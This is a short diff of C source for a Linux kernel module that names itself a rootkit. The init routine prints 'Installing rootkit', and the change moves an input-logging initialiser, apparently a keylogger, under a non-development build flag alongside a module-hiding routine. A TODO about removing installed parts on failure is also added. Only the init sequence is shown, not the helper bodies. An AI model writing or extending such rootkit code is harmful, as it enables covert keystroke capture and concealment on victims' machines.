@@ -14,6 +14,8 @@
 
 #define DEV_MODE
 
+
+//TODO: check if when an init function fails that the parts of the rootkit which were installed are removed.
 static int __init main_init(void) {
 	int error;
 	printk(KERN_INFO "Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
@@ -23,10 +25,11 @@ static int __init main_init(void) {
 	error = outputDevice_init();
 	if (error) return error;
 	
-	error = logInput_init();
-	if (error) return error;
 
 #ifndef DEV_MODE
+	error = logInput_init();
+	if (error) return error;
+	
 	error = moduleHide_start();
 	if (error) return error;
 #endif
